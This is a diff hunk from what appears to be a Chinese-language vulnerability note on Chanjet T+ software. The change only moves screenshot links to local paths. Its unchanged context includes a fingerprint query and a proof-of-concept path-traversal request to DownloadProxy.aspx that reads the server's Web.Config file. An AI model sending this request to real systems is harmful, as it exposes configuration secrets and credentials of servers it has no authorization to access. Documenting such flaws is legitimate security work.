@@ -20,7 +20,7 @@ app="畅捷通-TPlus"
 
 登录页面
 
-![image-20220909104559292](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209091045361.png)
+![image-20220909104559292](./images/202209091045361.png)
 
 验证POC
 
@@ -28,5 +28,5 @@ app="畅捷通-TPlus"
 /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
 ```
 
-![image-20220909104628456](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209091046535.png)
+![image-20220909104628456](./images/202209091046535.png)
 
